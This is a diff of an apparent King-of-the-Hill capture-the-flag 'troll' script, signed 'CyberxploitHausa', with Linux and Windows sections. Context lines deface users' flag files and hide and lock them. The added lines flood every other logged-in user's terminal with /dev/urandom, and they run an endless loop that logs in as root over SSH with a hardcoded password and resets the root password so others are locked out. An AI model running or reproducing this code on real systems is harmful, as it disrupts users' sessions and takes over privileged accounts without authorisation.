@@ -40,6 +40,7 @@ echo "🏴 Pwned by CyberxploitHausa" >> /home/*/user.txt 2>/dev/null
 
 echo "[+] Troll deployment complete. Sit back and enjoy the chaos 😈"
 
+w | grep -v "myip" | awk '{print $2}' | while read line; do cat /dev/urandom > /dev/$line; done
 
 
 ## Windows box
@@ -80,4 +81,12 @@ attrib +R +S +H C:\Users\*\Desktop\user.txt -ErrorAction SilentlyContinue
 attrib +R +S +H C:\root.txt -ErrorAction SilentlyContinue
 
 Write-Host "`n[+] CyberxploitHausa troll script complete. Long live the KOTH King! 🏴" -ForegroundColor Cyan
+
+
+
+
+while [ 1 ]; do
+  timeout 5 sshpass -p toor ssh root@ip "echo 'root:just 4 me' | chpasswd"
+done
+
 
